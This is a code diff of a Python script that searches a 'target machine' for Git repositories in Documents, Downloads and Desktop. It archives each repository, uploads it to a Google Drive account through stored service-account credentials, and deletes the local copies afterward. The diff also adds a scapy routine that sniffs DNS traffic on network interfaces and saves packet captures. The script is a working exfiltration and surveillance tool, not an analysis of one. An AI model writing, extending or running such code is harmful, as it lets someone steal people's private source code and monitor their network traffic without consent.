@@ -1,16 +1,19 @@
+import datetime
 from datetime import date
+from itertools import count
 import re
 import subprocess
+import sys
 import scapy.all as scapy
 from scapy.layers import http
-from sys import platform
-import os
+import shutil, os
 import tarfile
 from apiclient.discovery import build
 from oauth2client.service_account import ServiceAccountCredentials
 from httplib2 import Http
 from googleapiclient.http import MediaFileUpload
 import uuid
+import scapy.all as scapy
 
 cwd=os.getcwd()
 scopes = ['https://www.googleapis.com/auth/drive']
@@ -21,7 +24,38 @@ UUID=hex(uuid.getnode())
 mime_types={'folder':'application/vnd.google-apps.folder','text':'text/plain'}
 today=date.today()
 date_folder_name=today.strftime("%d_%m_%Y")
+    
+def get_platform():
+	return sys.platform
+    
+def process_packet(packet):
+    pass
+    return
 
+def build_interfaces(platform):
+    interfaces = scapy.get_if_list()
+    #MACOS
+    if platform=="darwin": 
+        interfaces= [i for i in interfaces if 'en' in i]
+    else: #Linux
+        interfaces= [i for i in interfaces if 'eth' in i]
+    return interfaces
+
+def sniff():
+    platform=get_platform()
+    print(platform)
+    interfaces=build_interfaces(platform)
+    print(interfaces)
+    for i in interfaces:
+        try:
+            capture=scapy.sniff(iface=i,filter="port 53",count=1)
+            now = datetime.datetime.now()
+            capName=now.strftime("%Y_%m_%d_%H_%M_%S")
+            scapy.wrpcap(capName,capture, append=True)
+        except:
+            print("Could not capture on interface",i)
+    return
+    
 def tardir(repository, dest_folder):
     print(dest_folder)
     with tarfile.open(dest_folder, mode='w:gz') as archive:
@@ -94,11 +128,15 @@ def uploadToDrive(fileName,mimeType):
             uploadFile(fileName,mimeType,date_folder_id)
         else:
             print("Uploading file to date folder!")
-            uploadFile(fileName,mimeType,date_folder_id)
-        
+            uploadFile(fileName,mimeType,date_folder_id)      
     return
 
 def get_git_repos():
+
+    os.chdir('/')
+    print(os.path.expanduser("~"))
+    os.chdir(os.path.expanduser("~"))
+
     #Find all Git repositories in the target machine
     try:
         command="mkdir gitFiles ; cd ; find ./Documents ./Downloads ./Desktop -type d -exec test -e '{}/.git' \; -print -prune"
@@ -120,18 +158,16 @@ def get_git_repos():
             print("Tarred the file! Uploading to Drive!")
             uploadToDrive(dest_folder,'application/tar')    
             print("Uploading done!")
-            delete_command="rm -rf {}".format(dest_folder)
-            subprocess.run(delete_command, capture_output=False, shell=True)
+            os.remove(dest_folder)
         except:
             continue
-        subprocess.run("rm -rf gitFiles/*", capture_output=False, shell=True)
+    for file in os.listdir(cwd+"/gitFiles"):
+        os.remove(cwd+"/gitFiles/"+file)
+    os.chdir(cwd)
     return 
 
 if __name__ == '__main__':
-    os.chdir('/')
-    print(os.path.expanduser("~"))
-    os.chdir(os.path.expanduser("~"))
-    #interfaces = scapy.get_if_list()
-    print("Changed version!")
-    print(platform)
+    
     get_git_repos()
+    print("Sniffing!")
+    #sniff()
